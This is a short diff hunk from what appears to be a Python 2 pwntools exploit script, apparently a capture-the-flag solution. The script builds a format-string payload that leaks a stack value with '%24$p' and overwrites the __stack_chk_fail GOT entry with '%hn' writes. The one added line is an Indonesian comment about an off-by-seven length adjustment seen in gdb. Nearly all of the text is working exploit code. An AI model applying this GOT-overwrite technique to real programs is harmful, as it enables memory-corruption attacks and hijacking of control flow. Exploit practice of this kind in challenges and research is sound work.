@@ -16,6 +16,7 @@ payload  = p32(stack_chk_fail_got)+'.%24$p'
 print repr(p32(vuln_addr+111)[:2])
 remain = 0x9211 - len(payload)
 l = remain - len(str(remain)) - len('%x%7$hn')+7
+# len('%x%7$hn') kayaknya gausah karna di gdb malah kelebihan 7 karakter
 payload += '%{}x%7$hn'.format(l)
 print len(payload), l, hex(l+len(payload)), l+len(payload)
 print 'payload =',repr(payload)
